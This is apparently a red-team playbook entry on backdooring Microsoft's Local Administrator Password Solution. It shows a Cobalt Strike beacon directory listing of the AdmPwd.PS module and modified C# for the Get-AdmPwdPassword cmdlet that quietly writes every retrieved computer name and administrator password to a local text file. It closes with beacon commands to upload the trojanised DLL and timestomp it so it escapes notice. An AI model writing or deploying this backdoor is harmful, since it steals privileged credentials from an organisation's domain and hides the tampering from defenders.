# Local Administrator Password Solution (LAPS) backdoor
Location of the LAPS scripts:
```sh
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
		  dir     03/10/2022 17:09:59   en-US
 30kb     fil     03/10/2022 00:38:16   AdmPwd.PS.dll
 5kb      fil     03/10/2022 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     03/10/2022 14:40:58   AdmPwd.PS.psd1
 33kb     fil     03/10/2022 08:02:08   AdmPwd.Utils.dll
```

1. Backdoor the `Get-AdmPwdPassword`: `https://github.com/GreyCorbel/admpwd`.
    ```powershell
    [Cmdlet("Get", "AdmPwdPassword")]
    public class GetPassword : Cmdlet
    {
        [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
        public String ComputerName;

        protected override void ProcessRecord() {
            foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
            {
                PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
                #added
                var line = $"{pi.ComputerName} : {pi.Password}";
                System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
                #added end
                WriteObject(pi);
            }
        }
    }
    ```
  
2. Upload `AdmPwd.PS.dll` to the machine.
    > beacon> upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll

3. Clone the `AdmPwd.PS.psd1` timestamp and apply it to `AdmPwd.PS.dll`.
    > beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```